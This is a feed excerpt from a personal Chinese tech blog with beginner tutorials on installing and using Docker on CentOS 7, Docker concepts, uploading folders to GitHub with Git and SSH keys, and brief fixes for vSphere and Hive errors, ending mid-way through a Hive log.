    <title>Centos7 Docker基本命令详解</title>
    <link href="https://plutoacharon.github.io/2019/11/04/Centos7-Docker%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <id>https://plutoacharon.github.io/2019/11/04/Centos7-Docker基本命令详解/</id>
    <published>2019-11-04T10:02:41.000Z</published>
    <updated>2019-11-04T10:03:12.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p>Ubuntu    14.04    版本系统中已经自带了    Docker    包，可以直接安装。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sudoapt-getupdate</span><br><span class="line">$sudoapt-getinstall-ydocker.io</span><br><span class="line">$sudoln-sf/usr/bin/docker.io/usr/local/bin/docker</span><br><span class="line">$sudosed-i&apos;$acomplete-F_dockerdocker&apos;/etc/bash_completion.d/docker.io</span><br></pre></td></tr></table></figure></p><p>这里咱们重点讲述Centos7的Docker安装</p><h3 id="一、检查系统内核"><a href="#一、检查系统内核" class="headerlink" title="一、检查系统内核"></a>一、检查系统内核</h3><p>Docker 要求 CentOS 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的CentOS 版本是否支持 Docker 。<br>通过 uname -r 命令查看你当前的内核版本<br><code>[root@master ~]# uname -r</code><br><img src="https://img-blog.csdnimg.cn/2019110210174488.png" alt="在这里插入图片描述"></p><h3 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h3><p>Docker 软件包和依赖包已经包含在默认的 CentOS-Extras 软件源里，安装命令如下：<br><code>[root@master ~]# yum -y install docker</code></p><blockquote><p>报错:<br><img src="https://img-blog.csdnimg.cn/20191102101935821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><p>虚拟机没有设置DNS地址</p><p>解决:</p><p>1、打开 vi /etc/resolv.conf，增加 nameserver 8.8.8.8<br>2、重启网络: service network restart<br><img src="https://img-blog.csdnimg.cn/2019110210205335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功</p><h3 id="查看docker版本"><a href="#查看docker版本" class="headerlink" title="查看docker版本"></a>查看docker版本</h3><p><code>[root@master ~]# docker version</code><br><img src="https://img-blog.csdnimg.cn/20191102102139909.png" alt="在这里插入图片描述"></p><h2 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h2><p>方式一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# service docker start</span><br><span class="line">Redirecting to /bin/systemctl start docker.service</span><br><span class="line">[root@master ~]# service docker status</span><br></pre></td></tr></table></figure></p><p><img src="https://img-blog.csdnimg.cn/20191102102210378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方式二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# systemctl start docker.service</span><br><span class="line">[root@master ~]# ps aux | grep docker</span><br></pre></td></tr></table></figure></p><h3 id="运行helloworld"><a href="#运行helloworld" class="headerlink" title="运行helloworld"></a>运行helloworld</h3><p><code>[root@node1 ~]# docker run hello-world</code><br><img src="https://img-blog.csdnimg.cn/20191102102546582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由于本地没有hello-world这个镜像，所以会下载一个hello-world的镜像，并在容器内运行。</p><h2 id="安装Ubuntu镜像"><a href="#安装Ubuntu镜像" class="headerlink" title="安装Ubuntu镜像"></a>安装Ubuntu镜像</h2><h3 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h3><p>从 Docker 镜像仓库获取镜像的命令是 <code>docker pul</code>l。<br>其命令格式为：<code>docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]</code><br>可以直接使用docker pull ubuntu命令安装镜像<br><code>[root@node1 ~]# docker pull ubuntu</code><br><img src="https://img-blog.csdnimg.cn/20191102103605851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="查看拥有的镜像"><a href="#查看拥有的镜像" class="headerlink" title="查看拥有的镜像"></a>查看拥有的镜像</h4><p><code>[root@node1 ~]$ docker images</code><br><img src="https://img-blog.csdnimg.cn/20191102103616836.png" alt="在这里插入图片描述">一个是ubuntu镜像，另一个是我们之前使用docker run hello-world命令下载的镜像。</p><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><h4 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h4><p>有了镜像后，我们就能够以这个镜像为基础启动并运行一个容器。<br><code>[root@node1 ~]# docker run -it --rm ubuntu bash</code><br><img src="https://img-blog.csdnimg.cn/20191102103905338.png" alt="在这里插入图片描述"><br>docker run 就是运行容器的命令，说明一下上面用到的参数。</p><ul><li>-it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因 此我们需要交互式终端。</li><li>–rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 –rm 可以避免浪费空间。</li><li>ubuntu ：这是指用ubuntu  镜像为基础来启动容器。</li><li>bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash。<h4 id="在容器中运行命令"><a href="#在容器中运行命令" class="headerlink" title="在容器中运行命令"></a>在容器中运行命令</h4>[root@6e024ac638c0 /]# cat /etc/os-release<br><img src="https://img-blog.csdnimg.cn/20191102103926611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入容器后，我们可以在 Shell 下操作，执行任何所需的命令。这里，我们执行了 cat /etc/os-release，这是 Linux 常用的查看当前系统版本的命令，从返回的结果可以看到容器内是 Ubuntu Linux 系统。</li></ul><p>最后我们可以通过 exit 退出了这个容器。</p><h4 id="查看镜像、容器、数据卷所占用的空间"><a href="#查看镜像、容器、数据卷所占用的空间" class="headerlink" title="查看镜像、容器、数据卷所占用的空间"></a>查看镜像、容器、数据卷所占用的空间</h4><p><code>[root@node1 ~]# docker system df</code><br><img src="https://img-blog.csdnimg.cn/20191102104037420.png" alt="在这里插入图片描述"></p><h4 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h4><ul><li>docker ps: 查看当前运行的容器</li><li>docker ps -a:查看所有容器，包括停止的。<br><img src="https://img-blog.csdnimg.cn/2019110210550748.png" alt="在这里插入图片描述"><br>标题含义：</li></ul><p>CONTAINER ID:容器的唯一表示ID。<br>IMAGE:创建容器时使用的镜像。<br>COMMAND:容器最后运行的命令。<br>CREATED:创建容器的时间。<br>STATUS:容器状态。<br>PORTS:对外开放的端口。<br>NAMES:容器名。可以和容器ID一样唯一标识容器，同一台宿主机上不允许有同名容器存在，否则会冲突。<br>使用命令停止并删除这个容器就可以</p><h4 id="运行容器-1"><a href="#运行容器-1" class="headerlink" title="运行容器"></a>运行容器</h4><p>使用命令运行容器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# docker run -it -v /home/docker/build:/root/build --privileged -h hadoop1 --name hadoop1 ubuntu /bin/bash</span><br><span class="line">root@hadoop1:/#</span><br></pre></td></tr></table></figure></p><p>以Ubuntu镜像启动一个容器，容器名是hadoop1，主机名是hadoop1，并且将基于容器的centos系统的/root/build目录与本地/home/docker/build共享。</p><p>参数解释：</p><ul><li>-v 表示基于容器的centos系统的/root/build目录与本地/home/hadoop/build共享；这可以很方便将本地文件上传到Docker内部的centos系统；</li><li>-h 指定主机名为hadoop1</li><li>–-name  指定容器名</li><li>/bin/bash  使用bash命令</li></ul><h4 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h4><p>基于已有的docker容器，做一新的dokcer image.</p><p>新开一个窗口</p><p><code>$ docker commit &lt;container_id&gt; &lt;image_name&gt;</code></p><p>可加参数</p><ul><li>-a, –author=”” 作者信息</li><li>-m, –message=”” 提交消息</li><li>-p, –pause=true 提交时暂停容器运行<br><img src="https://img-blog.csdnimg.cn/20191102110204919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><h3 id="查看镜像详细信息"><a href="#查看镜像详细信息" class="headerlink" title="查看镜像详细信息"></a>查看镜像详细信息</h3><p><code>[root@node1 ~]# docker inspect 镜像ID</code></p><p><img src="https://img-blog.csdnimg.cn/20191102110407869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="搜寻镜像"><a href="#搜寻镜像" class="headerlink" title="搜寻镜像"></a>搜寻镜像</h3><p><code>[root@node1 ~]# docker search mysql</code></p><p><img src="https://img-blog.csdnimg.cn/2019110211053267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>关键字包括:镜像名字,描述,星级(表示该镜像的受欢迎程度),是否官方创建,是否自动创建等.</p><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><p>使用镜像的标签删除镜像</p><p><code>docker rmi IMAGE [IMAGE,,,]</code></p><p>例如:<br><code>docker rmi ubuntu_base</code></p><p><img src="https://img-blog.csdnimg.cn/2019110211422286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当一个镜像有多个标签时,docker rmi命令只是删除了该镜像多个标签中的指定标签而已,并不影响镜像文件.</p><p>但是当镜像只剩下一个标签的时候,在使用<code>docker rmi</code>命令会彻底删除该镜像</p><h4 id="使用镜像ID删除镜像"><a href="#使用镜像ID删除镜像" class="headerlink" title="使用镜像ID删除镜像"></a>使用镜像ID删除镜像</h4><p>使用 <code>docker rmi</code>命令后面跟上镜像的ID时,会尝试删除所有指向该镜像的标签,然后删除该镜像文件本身</p><blockquote><p>注意: 当有该镜像创建的容器存在时,镜像文件默认是无法被删除的</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20191102114604116.png" alt="在这里插入图片描述"><br>如图可以看到,该镜像无法删除,这是因为基于该镜像的容器处于一个退出状态<br><img src="https://img-blog.csdnimg.cn/20191102114908114.png" alt="在这里插入图片描述"><br>正确做法是:先删除依赖该镜像的所有容器,再来删除镜像.</p><h3 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h3><h4 id="存出镜像"><a href="#存出镜像" class="headerlink" title="存出镜像"></a>存出镜像</h4><p><img src="https://img-blog.csdnimg.cn/20191102115553390.png" alt="在这里插入图片描述"><br><code>[root@node1 ~]# docker save -o ubuntu.tar docker.io/ubuntu</code><br><img src="https://img-blog.csdnimg.cn/20191102115530877.png" alt="在这里插入图片描述"></p><h4 id="载入镜像"><a href="#载入镜像" class="headerlink" title="载入镜像"></a>载入镜像</h4><p><code>docker load --input ubuntu.tar</code><br>或<br><code>docker load &lt;  ubuntu,tar</code></p><h3 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h3><p><code>docker push NAME[:TAG]</code></p><p>用户在DockerHub网站注册以后,即可上传自制的镜像.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Docker安装&quot;&gt;&lt;a href=&quot;#Docker安装&quot; class=&quot;headerlink&quot; title=&quot;Docker安装&quot;&gt;&lt;/a&gt;Docker安装&lt;/h2&gt;&lt;p&gt;Ubuntu    14.04    版本系统中已经自带了    Docker    包，可
      
    
    </summary>
    
      <category term="Docker" scheme="https://plutoacharon.github.io/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://plutoacharon.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Docker入门详解笔记</title>
    <link href="https://plutoacharon.github.io/2019/11/04/Docker%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3%E7%AC%94%E8%AE%B0/"/>
    <id>https://plutoacharon.github.io/2019/11/04/Docker入门详解笔记/</id>
    <published>2019-11-04T10:01:36.000Z</published>
    <updated>2019-11-04T10:03:13.614Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h2><p>Docker是一个开源项目，诞生于    2013年初，最初是<code>dotCloud</code>公司内部的一个业余项目。它基于Google公司推出的<code>Go</code>语言实现。</p><p>Docker项目的目标是实现轻量级的操作系统虚拟化解决方案。Docker的基础是Linux容器（LXC）等技术</p><p>在LXC的基础上<code>Docker</code>进行了进一步的封装，让用户不需要去关心容器的管理，使得操作更为简便。用<br>户操作<code>Docker</code>的容器就像操作一个快速轻量级的虚拟机一样简单</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>容器是在<strong>操作系统</strong>层面上实现虚拟化，直接复用本地主机的操作系统，而传统方式则是在<strong>硬件层面</strong>实现。</p><p><img src="https://img-blog.csdnimg.cn/20191102093225249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="为什么要使用Docker"><a href="#为什么要使用Docker" class="headerlink" title="为什么要使用Docker"></a>为什么要使用Docker</h2><p>首先，Docker容器的启动可以在秒级实现，这相比传统的虚拟机方式要快得多。</p><p>其次，Docker对系统资源的利用率很高，一台主机上可以同时运行数千个<code>Docker</code>容器。</p><p>容器除了运行其中应用外，基本不消耗额外的系统资源，使得应用的性能很高，同时系统的开销尽量小。</p><p>传统虚拟机方式运行10个不同的应用就要起10个虚拟机，而Docker只需要启动10个隔离的应用即可。</p><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><h4 id="更快速的交付和部署"><a href="#更快速的交付和部署" class="headerlink" title="更快速的交付和部署"></a>更快速的交付和部署</h4><ul><li>Docker    可以快速创建容器，快速迭代应用程序，并让整个过程全程可见</li><li>Docker    容器很轻很快！容器的启动时间是秒级的，大量地节约开发、测试、部署的时间。</li></ul><h4 id="更高效的虚拟化"><a href="#更高效的虚拟化" class="headerlink" title="更高效的虚拟化"></a>更高效的虚拟化</h4><ul><li>Docker    容器的运行不需要额外的    hypervisor    支持，它是内核级的虚拟化，因此可以实现更高的性能和效<br>率。</li></ul><h4 id="更轻松的迁移和扩展"><a href="#更轻松的迁移和扩展" class="headerlink" title="更轻松的迁移和扩展"></a>更轻松的迁移和扩展</h4><ul><li>Docker容器几乎可以在任意的平台上运行，包括物理机、虚拟机、公有云、私有云、个人电脑、服务器<br>等。这种兼容性可以让用户把一个应用程序从一个平台直接迁移到另外一个。</li></ul><h4 id="更简单的管理"><a href="#更简单的管理" class="headerlink" title="更简单的管理"></a>更简单的管理</h4><ul><li>使用    Docker，只需要小小的修改，就可以替代以往大量的更新工作。所有的修改都以增量的方式被分发和<br>更新，从而实现自动化并且高效的管理。</li></ul><h3 id="对比传统虚拟机"><a href="#对比传统虚拟机" class="headerlink" title="对比传统虚拟机"></a>对比传统虚拟机</h3><table><thead><tr><th>特性</th><th>容器</th><th>虚拟机</th></tr></thead><tbody><tr><td>启动</td><td>秒级</td><td>分钟级</td></tr></tbody></table><p>硬盘使用| 一般为MB|一般为GB|<br>性能|接近原生|弱于|<br>系统支持量|单机支持上千个容器|一般几十个|</p><h2 id="Docker基本概念"><a href="#Docker基本概念" class="headerlink" title="Docker基本概念"></a>Docker基本概念</h2><ul><li>镜像（Image）</li><li>容器（Container）</li><li>仓库（Repository）</li></ul><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p>Docker镜像就是一个只读的模板</p><p>例如：一个镜像可以包含一个完整的ubuntu操作系统环境，里面仅安装<code>Apache</code>或用户需要的其它应用程序。</p><p>镜像可以用来创建Docker容器。</p><p>Docker提供了一个很简单的机制来创建镜像或者更新现有的镜像，用户甚至可以直接从其他人那里下载一个已经做好的镜像来直接使用</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>Docker    利用容器来运行应用。</p><p>容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。</p><p>可以把容器看做是一个简易版的Linux环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p><blockquote><p>注：镜像是只读的，容器在启动的时候创建一层可写层作为<strong>最上层</strong>。</p></blockquote><h3 id="Docker仓库"><a href="#Docker仓库" class="headerlink" title="Docker仓库"></a>Docker仓库</h3><p>仓库是集中存放镜像文件的场所。有时候会把仓库和仓库注册服务器（Registry）混为一谈，并不严格区分。</p><p>实际上，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（tag）。</p><p>仓库分为公开仓库（Public）和私有仓库（Private）两种形式。</p><p>最大的公开仓库是<code>Docker    Hub</code>，存放了数量庞大的镜像供用户下载。</p><p>国内的公开仓库包括<code>Docker    Pool</code>等，可以提供大陆用户更稳定快速的访问。</p><p>当然，用户也可以在本地网络内创建一个私有仓库。</p><p>当用户创建了自己的镜像之后就可以使用<code>push</code>命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只需要从仓库上<code>pull</code>下来就可以了。</p><blockquote><p>注:Docker仓库的概念跟    Git    类似，注册服务器可以理解为    GitHub    这样的托管服务。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是Docker&quot;&gt;&lt;a href=&quot;#什么是Docker&quot; class=&quot;headerlink&quot; title=&quot;什么是Docker&quot;&gt;&lt;/a&gt;什么是Docker&lt;/h2&gt;&lt;p&gt;Docker是一个开源项目，诞生于    2013年初，最初是&lt;code&gt;dotCl
      
    
    </summary>
    
      <category term="Docker" scheme="https://plutoacharon.github.io/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://plutoacharon.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>win10 Git修改打开时的路径与上传文件夹到GitHub</title>
    <link href="https://plutoacharon.github.io/2019/11/04/win10-Git%E4%BF%AE%E6%94%B9%E6%89%93%E5%BC%80%E6%97%B6%E7%9A%84%E8%B7%AF%E5%BE%84%E4%B8%8E%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0GitHub/"/>
    <id>https://plutoacharon.github.io/2019/11/04/win10-Git修改打开时的路径与上传文件夹到GitHub/</id>
    <published>2019-11-04T09:49:44.000Z</published>
    <updated>2019-11-04T09:54:07.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="修改git快捷方式"><a href="#修改git快捷方式" class="headerlink" title="修改git快捷方式"></a>修改git快捷方式</h2><p>将Git快捷方式发送到桌面上,打开属性设置<br><img src="https://img-blog.csdnimg.cn/2019102821140853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191029171202330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="上传文件夹到GitHub"><a href="#上传文件夹到GitHub" class="headerlink" title="上传文件夹到GitHub"></a>上传文件夹到GitHub</h2><h3 id="配置免密"><a href="#配置免密" class="headerlink" title="配置免密"></a>配置免密</h3><p><code>ssh-keygen -t rsa</code><br><img src="https://img-blog.csdnimg.cn/20191029174217106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191029174146399.png" alt="在这里插入图片描述"></p><p>接下来，切换到个人github账号里，点击右上角用户头像下的小三角，找到setting，在右侧菜单栏中找到SSH and GPG keys，选择new SSH key，输入title，下面key的内容就是本机ssh key 公钥，直接将id_rsa.pub中的内容粘贴过来就可以，然后点击下面的add SSH key即可完成。<br><img src="https://img-blog.csdnimg.cn/20191029193345318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><ol><li><p>进入要上传的文件夹</p></li><li><p>执行指令进行初始化，会在原始文件夹中生成一个隐藏的文件夹.git：<br><code>git init</code></p></li><li><p>执行指令将文件添加到本地仓库<br><code>git add .</code>  //添加当前文件夹下的所有文件</p></li><li><p>输入本次的提交说明，准备提交暂存区中的更改的已跟踪文件，单引号内为说明内容：<br><code>git commit -m &quot; &quot;</code><br><img src="https://img-blog.csdnimg.cn/20191029194129759.png" alt="在这里插入图片描述"></p><h3 id="关联github仓库"><a href="#关联github仓库" class="headerlink" title="关联github仓库"></a>关联github仓库</h3></li></ol><h4 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库:"></a>新建仓库:</h4><p>这里我已经创建好了,就不再进行创建了<br>具体的创建仓库可以参考我的<a href="https://plutoacharon.github.io/2019/07/17/Github%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">GitHub学习笔记</a>这篇文章<br><img src="https://img-blog.csdnimg.cn/20191029194331232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><p><code>git remote add origin https://github.com/仓库地址</code><br><img src="https://img-blog.csdnimg.cn/20191029194617782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>注意：</p></blockquote><p>如果出现错误：fatal: remote origin already exists，则执行以下语句：<br> <code>git remote rm origin</code><br>再重新执行：<br><code>git remote add origin https://github.com/XX</code></p><p>然后执行命令：</p><p><code>git push origin master</code></p><p>如果出现错误failed to push som refs to…….，则执行以下语句，先把远程服务器github上面的文件拉先来，再push 上去</p><p><code>git pull origin master</code><br><img src="https://img-blog.csdnimg.cn/20191029200416294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;修改git快捷方式&quot;&gt;&lt;a href=&quot;#修改git快捷方式&quot; class=&quot;headerlink&quot; title=&quot;修改git快捷方式&quot;&gt;&lt;/a&gt;修改git快捷方式&lt;/h2&gt;&lt;p&gt;将Git快捷方式发送到桌面上,打开属性设置&lt;br&gt;&lt;img src=&quot;https:/
      
    
    </summary>
    
      <category term="GitHub" scheme="https://plutoacharon.github.io/categories/GitHub/"/>
    
    
      <category term="Git" scheme="https://plutoacharon.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>vsphere报错: 连接到虚拟机控制台失败并显示错误：VMRC 控制台的连接已断开。正在尝试重新连接</title>
    <link href="https://plutoacharon.github.io/2019/10/24/vsphere%E6%8A%A5%E9%94%99-%E8%BF%9E%E6%8E%A5%E5%88%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%A4%B1%E8%B4%A5%E5%B9%B6%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF%EF%BC%9AVMRC-%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%9A%84%E8%BF%9E%E6%8E%A5%E5%B7%B2%E6%96%AD%E5%BC%80%E3%80%82%E6%AD%A3%E5%9C%A8%E5%B0%9D%E8%AF%95%E9%87%8D%E6%96%B0%E8%BF%9E%E6%8E%A5/"/>
    <id>https://plutoacharon.github.io/2019/10/24/vsphere报错-连接到虚拟机控制台失败并显示错误：VMRC-控制台的连接已断开。正在尝试重新连接/</id>
    <published>2019-10-24T06:39:10.000Z</published>
    <updated>2019-10-24T06:39:48.953Z</updated>
    
    <content type="html"><![CDATA[<h2 id="解决"><a href="#解决" class="headerlink" title="解决:"></a>解决:</h2><ol><li><p>从 Windows 任务管理器停止 vmware-vmrc.exe *32 服务</p></li><li><p>卸载然后重新安装 vSphere Client</p></li><li><p>重启电脑</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;解决&quot;&gt;&lt;a href=&quot;#解决&quot; class=&quot;headerlink&quot; title=&quot;解决:&quot;&gt;&lt;/a&gt;解决:&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;从 Windows 任务管理器停止 vmware-vmrc.exe *32 服务&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;卸
      
    
    </summary>
    
      <category term="VMware" scheme="https://plutoacharon.github.io/categories/VMware/"/>
    
    
      <category term="VMware" scheme="https://plutoacharon.github.io/tags/VMware/"/>
    
  </entry>
  
  <entry>
    <title>Hive报错:javax.jdo.JDOFatalDataStoreException: Unable to open a test connection to the given database.</title>
    <link href="https://plutoacharon.github.io/2019/10/24/Hive%E6%8A%A5%E9%94%99-javax-jdo-JDOFatalDataStoreException-Unable-to-open-a-test-connection-to-the-given-database/"/>
    <id>https://plutoacharon.github.io/2019/10/24/Hive报错-javax-jdo-JDOFatalDataStoreException-Unable-to-open-a-test-connection-to-the-given-database/</id>
    <published>2019-10-24T06:37:16.000Z</published>
    <updated>2019-10-24T06:37:57.571Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/2019102321120560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Starting Hive Metastore Server</span><br><span class="line">SLF4J: Class path contains multiple SLF4J bindings.</span><br><span class="line">SLF4J: Found binding in [jar:file:/usr/hive/apache-hive-2.1.1-bin/lib/log4j-slf4j-impl-2.4.1.jar!/org/slf4j/impl/StaticLoggerBinder.class]</span><br><span 